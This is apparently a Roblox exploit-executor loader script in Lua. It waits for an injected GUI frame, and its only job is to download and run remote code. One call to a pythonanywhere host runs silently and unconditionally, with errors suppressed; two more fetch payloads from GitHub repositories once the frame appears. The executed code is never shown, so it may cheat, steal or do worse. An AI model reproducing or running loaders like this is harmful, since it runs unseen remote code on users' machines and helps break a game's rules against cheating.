local Players = game:GetService("Players")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local getHui = gethui or function() return game:GetService("CoreGui") end

task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://peeky.pythonanywhere.com/jjs?v=" .. tick()))()
    end)
end)

local function waitForTargetFrame()
    local startTime = tick()
    while tick() - startTime < 15 do
        local containers = {PlayerGui, getHui()}
        
        for _, container in ipairs(containers) do
            for _, gui in ipairs(container:GetChildren()) do
                if gui:IsA("ScreenGui") then
                    local frame = gui:FindFirstChild("Frame")
                    if frame then
                        return frame
                    end
                end
            end
        end
        
        task.wait(0.1)
    end
    return nil
end

local targetFrame = waitForTargetFrame()

if targetFrame then

    task.wait(0.8)

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/Extension1/refs/heads/main/1?v=" .. tick()))()
        end)
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/2/refs/heads/main/2?v=" .. tick()))()
        end)
    end)
else
    warn("couldnt load.")
end
